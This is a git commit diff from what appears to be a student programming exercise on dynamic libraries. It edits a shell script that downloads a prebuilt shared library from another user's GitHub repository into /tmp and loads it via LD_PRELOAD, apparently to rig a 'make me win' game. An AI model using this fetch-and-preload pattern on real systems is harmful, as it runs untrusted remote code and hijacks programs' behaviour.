b208817060e6e96ffd2692a6658711c7cd8a4987
mariamihabmo <mariam.ihab.mo@gmail.com>
2024-03-25 21:20:24 +0200

    jk

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -qP /tmp/ https://github.com/osala-eng/alx-low_level_programming/raw/master/0x18-dynamic_libraries/mymole.so
-export LD_PRELOAD="/tmp/mymole.so"
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
